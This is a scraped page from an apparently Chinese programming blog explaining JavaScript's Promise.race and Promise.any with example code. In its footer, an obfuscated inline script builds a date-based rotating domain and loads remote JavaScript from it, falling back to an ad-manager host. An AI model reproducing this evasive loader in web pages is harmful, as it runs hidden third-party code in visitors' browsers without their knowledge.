<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.race</span></code><span style="background-color:#fef2f0"> </span></span>在第一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象变为<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Fulfilled</span></code></span>之后，并不会 取消其他<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>对象的执行。</li>
<li>
<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.race</span></code></span>接受的是一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象数组，但是返回的确实最先完成<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Fulfilled</span></code><span style="background-color:#fef2f0"> </span></span>或者最先被<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Rejected</span></code></span>的一个<span style="color:#ed7976"><span style="background-color:#fef2f0">Promise</span></span>的结果</li>
</ul>
<p>下面我们来举个例子：</p> 
<pre><code class="language-javascript">
let arr = [1000, 3000, 5000, 7000];
let promiseArr = [];

for (let i = 0; i &lt; arr.length; i++) {
  let newPromise = new Promise((resolve, reject) =&gt; {
    if (i === 0) {
      reject(new Error("第二个错误"));
    } else {
      setTimeout(() =&gt; {
        console.log(arr[i]);
        resolve(arr[i]);
      }, arr[i]);
    }
  });
  promiseArr.push(newPromise);
}

Promise.race(promiseArr)
  .then((res) =&gt; {
    console.log(res);
  })
  .catch((err) =&gt; {
    console.log(err);
  });

// 控制台报错
// 3000
// 5000
// 7000
</code></pre> 
<p>这里我们再复习一下<strong><span style="color:#ed7976"><code><span style="background-color:#fef2f0">Node</span></code></span></strong>当中事件循环的知识：</p> 
<ul>
<li>第一层循环：i为0时，异步触发了<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.race().catch()</span></code></span>，这里面的回调代码被放在了微任务队列中， 后面的3个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">setTimeout</span></code></span>宏任务的回调函数代码被放进了<span style="color:#ed7976"><code><span style="background-color:#fef2f0">timer</span></code></span>阶段中的队列当中(其实并不是这样，因为 三个定时器都有延迟，都是在后面的事件循环中添加进来的)</li>
<li>第二层循环：清空微任务对列，所以控制台打印出了错误，然后清空宏任务，分别打印出<span style="color:#ed7976"><code><span style="background-color:#fef2f0">3000/5000/7000</span></code></span>
</li>
</ul>
<p></p> 
<p></p> 
<h2 id="9.%20Promise.any">9. Promise.any</h2> 
<p></p> 
<p><code>  <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.any</span></span></code>的入参和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all、Promise.race、Promise.allSettled</span></code></span>一样， 接收一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>对象的数组作为参数。</p> 
<ul>
<li>只要其中有一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>成功执行，就会返回已经成功执行的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>的结果</li>
<li>如果这个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>对象的数组中没有一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code><span style="background-color:#fef2f0"> </span></span>可以成功执行（即所有的 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>都失败 ），就返回一个失败的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code><span style="background-color:#fef2f0"> </span></span>和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">AggregateError</span></code></span>类型的实例，它是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Error</span></code></span>的一个子类，用于把单一的错误集合 在一起</li>
</ul>
<pre><code class="language-javascript">
var promise1 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    // reject(new Error("promise1--3000"));
    resoleve("promise1--3000");
  }, 3000);
});
var promise2 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    // reject(new Error("promise2--1000"))
    resoleve("promise1--1000");
  }, 1000);
});
var promise3 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    // resoleve("promise3--5000");
    reject(new Error("promise1--5000"))
  }, 5000);
});
var promiseArr = [promise1, promise2, promise3];
console.time("promiseArr");
Promise.any(promiseArr)
  .then((res) =&gt; {
    console.log("res", res); // res promise1--1000
    console.timeEnd("promiseArr");
  })
  .catch((err) =&gt; console.error(err)); 
  //所有的Promise都失败， AggregateError: All promises were rejected
</code></pre> 
<p>总计一下<span style="color:#ed7976"><strong><code><span style="background-color:#fef2f0">Promisea.any</span></code></strong></span>的应用场景：如果我们现在有多台服务器，则尽量使用响应速度最快的服务器，在这种情况下， 可以使用<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.any()</span></code></span>方法从最快的服务器接收响应。</p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>